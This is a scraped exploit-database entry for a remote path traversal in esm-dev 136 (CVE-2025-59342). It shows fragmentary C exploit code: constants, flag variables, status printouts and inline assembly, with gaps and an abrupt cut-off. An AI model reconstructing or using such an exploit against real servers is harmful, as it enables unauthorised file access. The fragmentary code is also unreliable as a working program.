---
title: esm-dev 136 Path Traversal
url: https://cxsecurity.com/issue/WLB-2026040004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-04-09
fetch_date: 2026-04-10T04:44:45.150232
---
...
|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **esm-dev 136 Path Traversal** **2026.04.09**  Credit:  **[Byte Reaper](https://cxsecurity.com/author/Byte%2BReaper/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-59342](https://cxsecurity.com/cveshow/CVE-2025-59342/ "Click to see CVE-2025-59342")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")** | |
...
#define FULL\_URL 2500
#define P\_Y 2000
#define POST\_DATA 9000
int flagPort = 0;
int port = 80;
int selectPort = -1;
int verbose = 0;
...
if (n == 0)
{
printf("\e[0;31m[-] sys\_fsync syscall Faild.\n");
fflush(stdout);
}
else if (n == 1)
{
printf("[+] sys\_fsync syscall Success.\n");
}
\_\_asm\_\_ volatile
(
"mov $0x0, %%rdi\n\t"
...
size\_t len3 = strlen(mes3);
size\_t len4 = strlen(mes4);
\_\_asm\_\_ volatile
(
"cmp $0x0, %[curlO]\n\t"
"je .donV\n\t"
